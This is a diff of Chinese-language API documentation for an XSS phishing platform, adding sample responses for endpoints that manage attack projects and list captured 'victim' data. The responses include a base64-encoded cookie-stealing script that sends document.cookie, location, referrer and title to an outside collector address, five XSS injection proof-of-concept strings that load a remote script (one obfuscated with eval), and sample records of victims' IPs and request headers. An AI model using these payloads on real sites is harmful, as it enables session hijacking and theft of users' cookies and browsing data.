@@ -18,9 +18,9 @@
 
 > 返回状态码
 
+- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
 - 200：创建后本地生成的js文件
 - 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
-- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
 - 500：请使用Post请求
 
 ### 修改跨站脚本钓鱼项目
@@ -43,10 +43,10 @@
 
 > 返回状态码
 
+- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
 - 200：文件内容覆盖成功~
 - 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
 - 404：你没有查询这个项目的权限哦宝贝~
-- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
 - 500：请使用Post请求
 
 ### 查询跨站脚本钓鱼项目
@@ -65,9 +65,35 @@
 
 > 返回状态码
 
-- 200：返回查询到的项目信息
-- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
 - 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
+
+- 200：返回查询到的项目信息
+
+  ```json
+  {
+  	"message": [{
+  		"project_name": "123123",
+  		"file_name": "HXKZM",
+  		"creation_time": "1608208943"
+  	}, {
+  		"project_name": "test",
+  		"file_name": "Ks1ZM",
+  		"creation_time": "1628208943"
+  	}],
+  	"code": 200
+  }
+  ```
+
+  > 返回参数解释
+
+  **会有多个数组的集合**
+
+  - `project_name`项目名称
+  - `file_name`文件名称
+  - `creation_time`创建时间
+
+- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
+
 - 500：请使用Post请求
 
 ### 查询跨站脚本钓鱼项目中数据
@@ -88,10 +114,49 @@
 
 > 返回状态码
 
-- 200：返回查询到的项目信息
-- 404：你没有查询这个项目的权限哦宝贝~
-- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
 - 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
+
+- 200：返回查询到的项目信息
+
+  ```json
+  {
+  	"message": [{
+  		"headers": "eydDb250ZW50LUxlbmd0aCc6ICcnLCAnQ29udGVudC1UeXBlJzogJ3RleHQvcGxhaW4nLCAnSG9zdCc6ICcxMDEuMzcuMTQuMTQ0Ojg4ODgnLCAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV80KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODcuMC40MjgwLjg4IFNhZmFyaS81MzcuMzYnLCAnQWNjZXB0JzogJyovKicsICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsICdBY2NlcHQtTGFuZ3VhZ2UnOiAnemgtQ04semg7cT0wLjknLCAnQ29ubmVjdGlvbic6ICdjbG9zZSd9",
+  		"project_associated_file_name": "KE29b",
+  		"ip": "142.3.56.28",
+  		"full_url": "http://1127.0.0.1:8888/a/KE29b/",
+  		"creation_time": "1609233542",
+  		"request_method": "GET",
+  		"data_pack": "e30="
+  	}, {
+  		"headers": "eydDb250ZW50LUxlbmd0aCc6ICcnLCAnQ29udGVudC1UeXBlJzogJ3RleHQvcGxhaW4nLCAnSG9zdCc6ICcxMDEuMzcuMTQuMTQ0Ojg4ODgnLCAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV80KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODcuMC40MjgwLjg4IFNhZmFyaS81MzcuMzYnLCAnQWNjZXB0JzogJ2ltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLGltYWdlLyosKi8qO3E9MC44JywgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ0FjY2VwdC1MYW5ndWFnZSc6ICd6aC1DTix6aDtxPTAuOScsICdDb25uZWN0aW9uJzogJ2Nsb3NlJ30=",
+  		"project_associated_file_name": "KE29b",
+  		"ip": "142.3.56.28",
+  		"full_url": "http://127.0.0.1:8888/a/KE29b/?location=file%3A///Users/user/Desktop/test.html&toplocation=file%3A///Users/user/Desktop/test.html&cookie=&opener=&referrer=&title=",
+  		"creation_time": "1609233552",
+  		"request_method": "GET",
+  		"data_pack": "eydsb2NhdGlvbic6ICdmaWxlOi8vL1VzZXJzL3VzZXIvRGVza3RvcC90ZXN0Lmh0bWwnLCAndG9wbG9jYXRpb24nOiAnZmlsZTovLy9Vc2Vycy91c2VyL0Rlc2t0b3AvdGVzdC5odG1sJywgJ2Nvb2tpZSc6ICcnLCAnb3BlbmVyJzogJycsICdyZWZlcnJlcic6ICcnLCAndGl0bGUnOiAnJ30="
+  	}],
+  	"code": 200
+  }
+  ```
+
+  > 返回参数解释
+
+  **会有多个数组的集合**
+
+  - `headers`受害者请求头数据，需要base64解密
+  - `project_associated_file_name`文件名称
+  - `ip`受害者IP
+  - `full_url`受害者请求完整路径
+  - `creation_time`受害者请求连接
+  - `request_method`请求方式
+  - `data_pack`请求数据包，需要base64解密
+
+- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
+
+- 404：你没有查询这个项目的权限哦宝贝~
+
 - 500：请使用Post请求
 
 ### 查询跨站脚本钓鱼项目详细信息
@@ -112,10 +177,37 @@
 
 > 返回状态码
 
-- 200：返回项目中js文件的详细信息，内容通过base64编码过，以及几个POC的利用语句
-- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
-- 404：你没有查询这个项目的权限哦宝贝~
 - 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
+
+- 200：返回项目中js文件的详细信息，内容通过base64编码过，以及几个POC的利用语句
+
+  ```json
+  {
+  	"message": {
+  		"project_associated_file_data": "dmFyIHggPSBuZXcgSW1hZ2UoKTsKdHJ5IHsKICAgIHZhciBteW9wZW5lciA9ICcnOwogICAgbXlvcGVuZXIgPSB3aW5kb3cub3BlbmVyICYmIHdpbmRvdy5vcGVuZXIubG9jYXRpb24gPyB3aW5kb3cub3BlbmVyLmxvY2F0aW9uOiAnJzsKfSBjYXRjaChlcnIpIHt9Cnguc3JjID0gJ2h0dHA6Ly8xMDEuMzcuMTQuMTQ0Ojg4ODgvYS9LRTI5Yi8/bG9jYXRpb249Jytlc2NhcGUoZG9jdW1lbnQubG9jYXRpb24pKycmdG9wbG9jYXRpb249Jytlc2NhcGUodG9wLmRvY3VtZW50LmxvY2F0aW9uKSsnJmNvb2tpZT0nK2VzY2FwZShkb2N1bWVudC5jb29raWUpKycmb3BlbmVyPScrZXNjYXBlKG15b3BlbmVyKSsnJnJlZmVycmVyPScrZXNjYXBlKGRvY3VtZW50LnJlZmVycmVyKSsnJnRpdGxlPScrZXNjYXBlKGRvY3VtZW50LnRpdGxlKTs=",
+  		"the_first_use": "</tExtArEa>'\"><sCRiPt sRC=//127.0.0.1:1234/s/KE29b></sCrIpT>",
+  		"the_second_use": "<sCRiPt/SrC=//127.0.0.1:1234/s/KE29b>",
+  		"the_third_use": "<img sRC=//127.0.0.1:1234/s/KE29b>",
+  		"exploit_path": "//127.0.0.1:1234/s/KE29b",
+  		"coding_exploit": "</tEXtArEa>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22%2F%2F127.0.0.1:1234%2Fs%2FKE29b%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>"
+  	},
+  	"code": 200
+  }
+  ```
+
+  > 返回参数解释
+
+  - `project_associated_file_data`项目文件完整内容，需要用base64解密
+  - `the_first_use`第一个POC
+  - `the_second_use`第二个POC
+  - `the_third_use`第三个POC
+  - `exploit_path`第四个POC
+  - `coding_exploit`第五个POC
+
+- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
+
+- 404：你没有查询这个项目的权限哦宝贝~
+
 - 500：请使用Post请求
 
 ### 读取默认跨站脚本模板数据
@@ -134,9 +226,32 @@
 
 > 返回状态码
 
-- 200：返回查询到的项目信息
-- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
 - 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
+
+- 200：返回查询到的项目信息
+
+  ```json
+  {
+  	"message": [{
+  		"file_name": "test.js",
+  		"file_data": "YWxlcnQoInhzcyIpOw=="
+  	}, {
+  		"file_name": "get_cookie.js",
+  		"file_data": "dmFyIHggPSBuZXcgSW1hZ2UoKTsKdHJ5IHsKICAgIHZhciBteW9wZW5lciA9ICcnOwogICAgbXlvcGVuZXIgPSB3aW5kb3cub3BlbmVyICYmIHdpbmRvdy5vcGVuZXIubG9jYXRpb24gPyB3aW5kb3cub3BlbmVyLmxvY2F0aW9uOiAnJzsKfSBjYXRjaChlcnIpIHt9Cnguc3JjID0gJ2h0dHA6Ly9pcC9hL+mhueebruaWh+S7tuWcsOWdgC8/bG9jYXRpb249Jytlc2NhcGUoZG9jdW1lbnQubG9jYXRpb24pKycmdG9wbG9jYXRpb249Jytlc2NhcGUodG9wLmRvY3VtZW50LmxvY2F0aW9uKSsnJmNvb2tpZT0nK2VzY2FwZShkb2N1bWVudC5jb29raWUpKycmb3BlbmVyPScrZXNjYXBlKG15b3BlbmVyKSsnJnJlZmVycmVyPScrZXNjYXBlKGRvY3VtZW50LnJlZmVycmVyKSsnJnRpdGxlPScrZXNjYXBlKGRvY3VtZW50LnRpdGxlKTs="
+  	}],
+  	"code": 200
+  }
+  ```
+
+  > 返回参数解释
+
+  **会有多个数组的集合**
+
+  - `file_name`文件名称
+  - `file_data`文件数据，需要base64解密
+
+- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
+
 - 500：请使用Post请求
 
 ### 读取用户自定义跨站脚本模板数据
@@ -155,9 +270,38 @@
 
 > 返回状态码
 
-- 200：返回查询到的项目信息
-- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
 - 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
+
+- 200：返回查询到的项目信息
+
+  ```json
+  {
+  	"message": [{
+  		"template_name": "test",
+  		"template_data": "Ij48aDE+MTEx",
+  		"creation_time": "1609232907",
+  		"update_time": "1609233097"
+  	}, {
+  		"template_name": "11",
+  		"template_data": "MTE=",
+  		"creation_time": "1609234294",
+  		"update_time": "1609234294"
+  	}],
+  	"code": 200
+  }
+  ```
+
+  > 返回参数解释
+
+  **会有多个数组的集合**
+
+  - `template_name`模板名称
+  - `template_data`模板数据，需要使用base64解密
+  - `creation_time`模板创建时间
+  - `update_time`模板更新时间
+
+- 403：嘿~宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
+
 - 500：请使用Post请求
 
 ### 保存用户自定义跨站脚本模板数据
